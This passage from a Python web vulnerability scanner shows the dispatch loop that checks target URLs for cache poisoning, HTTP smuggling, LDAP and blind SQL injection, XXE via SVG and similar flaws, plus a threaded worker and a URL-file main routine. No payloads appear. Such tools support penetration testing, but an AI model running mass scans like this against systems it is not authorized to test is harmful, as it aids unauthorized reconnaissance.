            f"\033[1;97mSensitive Data Exposure \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no Sensitive Data Exposure vulnerability
        print_message(
            "info",
            f"\033[1;97mSensitive Data Exposure \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for Unrestricted File Upload vulnerability
    if test_unrestricted_file_upload(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating Unrestricted File Upload vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mUnrestricted File Upload \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no Unrestricted File Upload vulnerability
        print_message(
            "info",
            f"\033[1;97mUnrestricted File Upload \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for HTTP Verb Tampering vulnerability
    if test_http_verb_tampering(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating HTTP Verb Tampering vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mHTTP Verb Tampering \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no HTTP Verb Tampering vulnerability
        print_message(
            "info",
            f"\033[1;97mHTTP Verb Tampering \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for Cache Poisoning vulnerability
    if test_cache_poisoning(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating Cache Poisoning vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mCache Poisoning \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no Cache Poisoning vulnerability
        print_message(
            "info",
            f"\033[1;97mCache Poisoning \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for HTTP Response Splitting vulnerability
    if test_http_response_splitting(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating HTTP Response Splitting vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mHTTP Response Splitting \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no HTTP Response Splitting vulnerability
        print_message(
            "info",
            f"\033[1;97mHTTP Response Splitting \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for LDAP Injection vulnerability
    if test_ldap_injection(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating LDAP Injection vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mLDAP Injection \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no LDAP Injection vulnerability
        print_message(
            "info",
            f"\033[1;97mLDAP Injection \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for HTTP Smuggling vulnerability
    if test_http_smuggling(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating HTTP Smuggling vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mHTTP Smuggling \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no HTTP Smuggling vulnerability
        print_message(
            "info",
            f"\033[1;97mHTTP Smuggling \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for Web Cache Deception vulnerability
    if test_web_cache_deception(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating Web Cache Deception vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mWeb Cache Deception \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no Web Cache Deception vulnerability
        print_message(
            "info",
            f"\033[1;97mWeb Cache Deception \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for HTTP Desync vulnerability
    if test_http_desync(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating HTTP Desync vulnerability
        print_message(
            "vulnerable", f"\033[1;97mHTTP Desync \033[1;92mVulnerable\033[1;97m: {url}"
        )
    else:
        total_scans += 1
        # Print a message indicating no HTTP Desync vulnerability
        print_message(
            "info", f"\033[1;97mHTTP Desync \033[1;91mNot Vulnerable\033[1;97m: {url}"
        )

    # Test for SSI Injection vulnerability
    if test_ssi_injection(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating SSI Injection vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mSSI Injection \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no SSI Injection vulnerability
        print_message(
            "info", f"\033[1;97mSSI Injection \033[1;91mNot Vulnerable\033[1;97m: {url}"
        )

    # Test for HPP in Headers vulnerability
    if test_hpp_in_headers(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating HPP in Headers vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mHPP in Headers \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no HPP in Headers vulnerability
        print_message(
            "info",
            f"\033[1;97mHPP in Headers \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for Email Header Injection vulnerability
    if test_email_header_injection(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating Email Header Injection vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mEmail Header Injection \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no Email Header Injection vulnerability
        print_message(
            "info",
            f"\033[1;97mEmail Header Injection \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for XXE via SVG vulnerability
    if test_xxe_via_svg(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating XXE via SVG vulnerability
        print_message(
            "vulnerable", f"\033[1;97mXXE via SVG \033[1;92mVulnerable\033[1;97m: {url}"
        )
    else:
        total_scans += 1
        # Print a message indicating no XXE via SVG vulnerability
        print_message(
            "info", f"\033[1;97mXXE via SVG \033[1;91mNot Vulnerable\033[1;97m: {url}"
        )

    # Test for Blind SQL Injection vulnerability
    if test_blind_sql_injection(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating Blind SQL Injection vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mBlind SQL Injection \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no Blind SQL Injection vulnerability
        print_message(
            "info",
            f"\033[1;97mBlind SQL Injection \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )

    # Test for HTTP Method Override vulnerability
    if test_http_method_override(url):
        total_scans += 1
        vulnerabilities_found += 1
        # Print a message indicating HTTP Method Override vulnerability
        print_message(
            "vulnerable",
            f"\033[1;97mHTTP Method Override \033[1;92mVulnerable\033[1;97m: {url}",
        )
    else:
        total_scans += 1
        # Print a message indicating no HTTP Method Override vulnerability
        print_message(
            "info",
            f"\033[1;97mHTTP Method Override \033[1;91mNot Vulnerable\033[1;97m: {url}",
        )


# Worker function to process URLs from the queue
def worker(queue):
    # Loop until the queue is empty
    while not queue.empty():
        # Get the next URL from the queue
        url = queue.get()
        # Print a message indicating the URL being tested
        print_message("listing", f"\033[1;97mTesting \033[1;95m{url}")
        # Test the URL for all CVEs
        test_cves(url)
        # Mark the task as done in the queue
        queue.task_done()
        print("")


# Main function to handle argument parsing and initiate scanning
def main():
    global total_scans, vulnerabilities_found
    # Display a banner (function not defined in the provided script)
    banner()
    # Create an argument parser for command-line arguments
    parser = argparse.ArgumentParser(
        description="CVE Scanner for various vulnerabilities."
    )
    # Add an argument for the file containing the list of URLs
    parser.add_argument(
        "-f",
        "--file",
        help="File containing list of URLs (one per line)",
        required=False,
    )

    # Parse the command-line arguments
    args = parser.parse_args()

    # Create a log directory (function not defined in the provided script)
    create_log_dir()

    # If no file argument is provided, prompt the user for the file path
    if not args.file:
        args.file = input(
            "\033[1;93mPlease provide the path to the file containing the list of URLs:\033[1;92m "
        )
        print("")

    # Open the file containing the list of URLs
    with open(args.file, "r") as f:
        # Read the URLs from the file, stripping any whitespace
        urls = [line.strip() for line in f if line.strip()]

    # Print a message indicating the file being processed
    print_message(
        "listing",
        f"\033[1;93mTesting multiple targets from\033[1;92m {args.file} \033[1;93mfile",
    )
    print("")

    # Create a queue to hold the URLs
    url_queue = queue.Queue()
    # Add each URL to the queue
    for url in urls:
        url_queue.put(url)
        
    # Create a list to hold the threads
    threads = []
    # Create and start 1 threads to process the URLs by default, you can change the value to a MAX of 10
    for _ in range(1):
        t = threading.Thread(target=worker, args=(url_queue,))
        t.start()
        threads.append(t)

    # Wait for all threads to complete
    for t in threads:
        t.join()

    # Print a message indicating the scanning is complete
    print_message("success", "\033[1;92mScanning complete.")
    print("")

    # Display the total number of scans and vulnerabilities found
    print_message("info", f"\033[1;93mTotal scans performed: \033[1;97m{total_scans}\033[0m")
    print_message("info", f"\033[1;93mTotal vulnerabilities found: \033[1;92m{vulnerabilities_found}\033[0m")


# Check if the script is being run directly and not imported
if __name__ == "__main__":
    # Call the main function to start the scanning process
    main()
